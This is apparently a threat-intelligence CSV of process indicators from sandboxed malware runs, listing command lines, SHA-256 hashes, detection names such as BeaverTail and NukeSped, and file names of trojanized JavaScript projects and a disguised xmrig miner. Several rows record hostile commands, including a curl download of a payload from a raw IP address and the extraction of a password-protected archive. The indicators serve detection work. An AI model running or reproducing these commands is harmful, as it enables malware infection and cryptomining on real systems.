"Indicator_Type","Unique_Item","File_Hash","Malware_Family","Meaningful_Name","Last_Observation_Date"
"Process","awk BEGIN {
    if (ARGV[1] == """" || ARGV[2] == """") exit(1)
    split(ARGV[1], a, /\./);
    split(ARGV[2], b, /\./);
    for (i=1; i<=3; i++) {
      if (a[i] && a[i] !~ /^[0-9]+$/) exit(2);
      if (b[i] && b[i] !~ /^[0-9]+$/) { exit(0); }
      if (a[i] < b[i]) exit(3);
      else if (a[i] > b[i]) exit(0);
    }
    exit(4)
  } 0.12.0 20.19.0","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","awk BEGIN {
    if (ARGV[1] == """" || ARGV[2] == """") exit(1)
    split(ARGV[1], a, /\./);
    split(ARGV[2], b, /\./);
    for (i=1; i<=3; i++) {
      if (a[i] && a[i] !~ /^[0-9]+$/) exit(2);
      if (b[i] && b[i] !~ /^[0-9]+$/) { exit(0); }
      if (a[i] < b[i]) exit(3);
      else if (a[i] > b[i]) exit(0);
    }
    exit(4)
  } 14.17.0 20.19.0","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","awk BEGIN {
    if (ARGV[1] == """" || ARGV[2] == """") exit(1)
    split(ARGV[1], a, /\./);
    split(ARGV[2], b, /\./);
    for (i=1; i<=3; i++) {
      if (a[i] && a[i] !~ /^[0-9]+$/) exit(2);
      if (b[i] && b[i] !~ /^[0-9]+$/) { exit(0); }
      if (a[i] < b[i]) exit(3);
      else if (a[i] > b[i]) exit(0);
    }
    exit(4)
  } 16.0.0 20.19.0","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","awk -v lts= {
        if (!$1) { next }
        if (lts && $10 ~ /^\-?$/) { next }
        if (lts && lts != ""*"" && tolower($10) !~ tolower(lts)) { next }
        if ($10 !~ /^\-?$/) {
          if ($10 && $10 != prev) {
            print $1, $10, ""*""
          } else {
            print $1, $10
          }
        } else {
          print $1
        }
        prev=$10;
      }","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","bash","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","C:\Program Files\Google1212_1901400895\bin\updater.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Program Files\Google2436_1682079371\bin\updater.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Program Files\Google2492_603267117\bin\updater.exe","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Program Files\Google3276_1581023241\bin\updater.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Program Files\Google3288_1073752885\bin\updater.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Program Files\Google3484_1854522742\bin\updater.exe","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Program Files\Google3516_1186761989\bin\updater.exe","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Program Files\Google3652_957345543\bin\updater.exe","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Program Files\Google3764_830584887\bin\updater.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Program Files\Google3944_211648194\bin\updater.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Program Files\Google616_714658953\bin\updater.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Windows\Explorer.EXE","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Process","C:\Windows\System32\cmd.exe","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Windows\System32\cmd.exe C:\Windows\system32\cmd.exe /d /s /c ""C:\Users\user\Desktop\.vscode\argv.json x -pppp C:\Users\user\AppData\Local\Temp\p9.7z -oC:\Users\user""","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Windows\System32\cmd.exe C:\Windows\system32\cmd.exe /d /s /c ""curl -Lo ""C:\Users\user\AppData\Local\Temp\p8.zi"" ""http://172.86.93.139:3000/pdown""""","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","8dd6cbb69e0f9e588a4e8f0be76693f90bbc80142d7034427a17175b387e5373","Unknown","FreeBlingDash.zip","2024-11-08"
"Process","C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","0a49f0a8d0b1e856b7d109229dfee79212c10881dcc4011b98fe69fc28100182","Unknown","VCam_ARM64.zip","2025-07-22"
"Process","C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Windows\System32\conhost.exe C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","92837283a26f56a8de586897a7cb9481acc45426c2488e22184680ea04f25895","Unknown","ebenra.zip","2024-12-06"
"Process","C:\Windows\System32\curl.exe curl  -Lo ""C:\Users\user\AppData\Local\Temp\p8.zi"" ""http://172.86.93.139:3000/pdown""","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Windows\system32\DllHost.exe /Processid:{AA65DD7C-83AC-48C0-A6FD-9B61FEBF8800}","9325e1a531607ee365903c342720babed0517a6162260365a856da92bd456be0","Trojan:JS/BeaverTail","ebenra-main/backend/function.js","2024-11-08"
"Process","C:\Windows\system32\lsass.exe","db640a3823667682c6b2ea580ee158de96e198224b37db2bf9faacb3c39cf06f","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\lsass.exe","2067d016d21aeda575208e9d262101840c27cd41a889e9b64313f9a4af51c9bc","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\mousocoreworker.exe -Embedding","9325e1a531607ee365903c342720babed0517a6162260365a856da92bd456be0","Trojan:JS/BeaverTail","ebenra-main/backend/function.js","2024-11-08"
"Process","C:\Windows\system32\msiexec.exe /V","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Process","C:\Windows\System32\msiexec.exe C:\Windows\system32\msiexec.exe /V","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Process","C:\Windows\System32\OpenWith.exe C:\Windows\system32\OpenWith.exe -Embedding","c6774961e12c14b91f6673ad47ce44d489cdbdd193e031ded367a36f531b6ab9","Unknown","VCam_x86_64.zip","2025-04-28"
"Process","C:\Windows\System32\RuntimeBroker.exe -Embedding","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\services.exe","2067d016d21aeda575208e9d262101840c27cd41a889e9b64313f9a4af51c9bc","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\services.exe","db640a3823667682c6b2ea580ee158de96e198224b37db2bf9faacb3c39cf06f","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\services.exe","9325e1a531607ee365903c342720babed0517a6162260365a856da92bd456be0","Trojan:JS/BeaverTail","ebenra-main/backend/function.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","39d21c9405245e27bbd2a6abbb0abbe2e4d9094bf6123a875298e4e97e752d57","Unknown","Lumanagi-Dex-master/backend/routes/routes.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","0fcb68886749cb8f429acf28ab1904ae51a350fede47547b1356e6b2f34adbd3","Trojan:JS/BeaverObfus.A!MTB","jupiter-main/app/run.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","113bf022d6d028b2745b46593fbec932ee24f04bc22deab117f5379a3674cc26","Trojan:JS/NukeSped.HNAA!MTB","express-react/backend/routes/userRoutes.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","093c0a410e20a101a6dfe729abd298f406f09620f4bb813bb15d18b9ad5e1c45","Trojan:JS/NukeSped.HNAA!MTB","db90004a-90d4-460e-bb03-237b015120cd/js/infrectedjs.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","8efa928aa896a5bb3715b8b0ed20881029b0a165a296334f6533fa9169b4463b","TrojanDropper:JS/BeaverTail.B!dha","game_backend/game_backend/utils/encryptionUtilities.js","2025-10-16"
"Process","C:\Windows\system32\services.exe","0bf43170dd9f66905e7a335de35e06d2e34a5842200b59f18518688f4f60c3f8","Trojan:JS/BeaverTail","gdpcoin-portal-main/client/tailwind.config.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","72ebfe69c69d2dd173bb92013ab44d895a3367f91f09e3f8d18acab44e37b26d","Trojan:JS/Obfuse!MSR","african-economy-main/src/store/actions/act.js","2025-10-16"
"Process","C:\Windows\system32\services.exe","9f24f2e82ac7176f82969081a7c56c670518dcc475d5b8193135f1887a8392d5","TrojanDropper:JS/BeaverTail.E!AMTB","src/setupTest.js","2025-02-27"
"Process","C:\Windows\system32\services.exe","f08d3e3f335a9bb379cb35c1972c3a90257c7238cb8f71156a851093171ad8f9","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\services.exe","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Process","C:\Windows\system32\services.exe","f89658839174089720f0841dec8c25e3e0b7b13782cc14d70d63cf97c1156580","TrojanDropper:JS/BeaverTail.E!AMTB","utils/address.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","b638fa88f553bdea4f416eb21a6dbec1a9a34f1564454193ab77e62a97f965eb","Trojan:JS/NukeSped.HNAA!MTB","komeq-7a4e23ce8453c114a5642550bd51e166cd78bf3c/backend/routes/appRoutes/appApi.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","dff6d20c15cb60171d039ab3d276c7356f7d4158e1b6e195101fab4dc1b8c0f6","Trojan:JS/Obfuse!MSR","freebling-landing-web-app-f5bd7381bf2a/next.config.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","c2ea2ed2ba9cba62e900ed1914ef54a9d659870d3cf0c8ac79348ee7b80badf4","TrojanDropper:JS/BeaverTail.B!dha","C:\Users\user\AppData\Local\Temp\sgeucjpt.spx\FreeBlingDash\src\utils\searchFeatures.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","94555776847f88351c27e2e400790f7a66e6b4d1002f0a98a743b1f6f3207a8b","TrojanDropper:JS/BeaverTail.E!AMTB","grempe012-fortunetree-41b878bdaf3c/node_modules/express/index.js","2024-11-08"
"Process","C:\Windows\system32\services.exe","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\System32\slui.exe -Embedding","72ebfe69c69d2dd173bb92013ab44d895a3367f91f09e3f8d18acab44e37b26d","Trojan:JS/Obfuse!MSR","african-economy-main/src/store/actions/act.js","2025-10-16"
"Process","C:\Windows\system32\svchost.exe -k DcomLaunch -p","f89658839174089720f0841dec8c25e3e0b7b13782cc14d70d63cf97c1156580","TrojanDropper:JS/BeaverTail.E!AMTB","utils/address.js","2024-11-08"
"Process","C:\Windows\system32\svchost.exe -k DcomLaunch -p","dff6d20c15cb60171d039ab3d276c7356f7d4158e1b6e195101fab4dc1b8c0f6","Trojan:JS/Obfuse!MSR","freebling-landing-web-app-f5bd7381bf2a/next.config.js","2024-11-08"
"Process","C:\Windows\system32\svchost.exe -k DcomLaunch -p","9f24f2e82ac7176f82969081a7c56c670518dcc475d5b8193135f1887a8392d5","TrojanDropper:JS/BeaverTail.E!AMTB","src/setupTest.js","2025-02-27"
"Process","C:\Windows\system32\svchost.exe -k LocalService -s W32Time","db640a3823667682c6b2ea580ee158de96e198224b37db2bf9faacb3c39cf06f","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\svchost.exe -k LocalService -s W32Time","2067d016d21aeda575208e9d262101840c27cd41a889e9b64313f9a4af51c9bc","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc","db640a3823667682c6b2ea580ee158de96e198224b37db2bf9faacb3c39cf06f","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc","2067d016d21aeda575208e9d262101840c27cd41a889e9b64313f9a4af51c9bc","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\svchost.exe -k NetworkService -p","db640a3823667682c6b2ea580ee158de96e198224b37db2bf9faacb3c39cf06f","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\svchost.exe -k NetworkService -p","2067d016d21aeda575208e9d262101840c27cd41a889e9b64313f9a4af51c9bc","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\svchost.exe -k UnistackSvcGroup","db640a3823667682c6b2ea580ee158de96e198224b37db2bf9faacb3c39cf06f","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\system32\svchost.exe -k UnistackSvcGroup","2067d016d21aeda575208e9d262101840c27cd41a889e9b64313f9a4af51c9bc","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\UI0Detect.exe","e79b827b3cc29e940736dc20cc9c25958c0b09c25fc0bc8aacbd6365f38db71f","Unknown","node.exe","2025-09-22"
"Process","C:\Windows\System32\UI0Detect.exe","49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb","Unknown","xmrig.exe","2025-05-25"
"Process","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding","dff6d20c15cb60171d039ab3d276c7356f7d4158e1b6e195101fab4dc1b8c0f6","Trojan:JS/Obfuse!MSR","freebling-landing-web-app-f5bd7381bf2a/next.config.js","2024-11-08"
"Process","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding","9f24f2e82ac7176f82969081a7c56c670518dcc475d5b8193135f1887a8392d5","TrojanDropper:JS/BeaverTail.E!AMTB","src/setupTest.js","2025-02-27"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/App.test.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/.babelrc.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/docs.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/src/application.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/src/ie-emulation-modes-warning.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/src/pwa.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/vendor/anchor.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/vendor/clipboard.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/vendor/holder.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/vendor/jquery-slim.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/assets/js/vendor/popper.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/change-version.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/generate-sri.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/lint-vars.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/postcss.config.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/rollup.config.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/saucelabs-unit-test.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/vnu-jar.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/build/workbox.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/dist/js/bootstrap.bundle.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/dist/js/bootstrap.bundle.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/dist/js/bootstrap.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/dist/js/bootstrap.min.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\system32\wscript.exe  ""C:\Users\<USER>\AppData\Local\Temp\twm-marketplace-v1-main/client/src/assets/modules/bootstrap/docs/4.0/examples/offcanvas/offcanvas.js","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\app.js""","f08d3e3f335a9bb379cb35c1972c3a90257c7238cb8f71156a851093171ad8f9","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\app.js""","2067d016d21aeda575208e9d262101840c27cd41a889e9b64313f9a4af51c9bc","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\download.js""","72ebfe69c69d2dd173bb92013ab44d895a3367f91f09e3f8d18acab44e37b26d","Trojan:JS/Obfuse!MSR","african-economy-main/src/store/actions/act.js","2025-10-16"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\encryptionUtilities.js""","8efa928aa896a5bb3715b8b0ed20881029b0a165a296334f6533fa9169b4463b","TrojanDropper:JS/BeaverTail.B!dha","game_backend/game_backend/utils/encryptionUtilities.js","2025-10-16"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\function.js""","9325e1a531607ee365903c342720babed0517a6162260365a856da92bd456be0","Trojan:JS/BeaverTail","ebenra-main/backend/function.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\index.js""","94555776847f88351c27e2e400790f7a66e6b4d1002f0a98a743b1f6f3207a8b","TrojanDropper:JS/BeaverTail.E!AMTB","grempe012-fortunetree-41b878bdaf3c/node_modules/express/index.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\malware-1.js""","9f24f2e82ac7176f82969081a7c56c670518dcc475d5b8193135f1887a8392d5","TrojanDropper:JS/BeaverTail.E!AMTB","src/setupTest.js","2025-02-27"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\next.config.js""","dff6d20c15cb60171d039ab3d276c7356f7d4158e1b6e195101fab4dc1b8c0f6","Trojan:JS/Obfuse!MSR","freebling-landing-web-app-f5bd7381bf2a/next.config.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\routes.js""","39d21c9405245e27bbd2a6abbb0abbe2e4d9094bf6123a875298e4e97e752d57","Unknown","Lumanagi-Dex-master/backend/routes/routes.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\run.js""","0fcb68886749cb8f429acf28ab1904ae51a350fede47547b1356e6b2f34adbd3","Trojan:JS/BeaverObfus.A!MTB","jupiter-main/app/run.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\sample.js""","093c0a410e20a101a6dfe729abd298f406f09620f4bb813bb15d18b9ad5e1c45","Trojan:JS/NukeSped.HNAA!MTB","db90004a-90d4-460e-bb03-237b015120cd/js/infrectedjs.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\sample.js""","b638fa88f553bdea4f416eb21a6dbec1a9a34f1564454193ab77e62a97f965eb","Trojan:JS/NukeSped.HNAA!MTB","komeq-7a4e23ce8453c114a5642550bd51e166cd78bf3c/backend/routes/appRoutes/appApi.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\sample.js""","f89658839174089720f0841dec8c25e3e0b7b13782cc14d70d63cf97c1156580","TrojanDropper:JS/BeaverTail.E!AMTB","utils/address.js","2024-11-08"
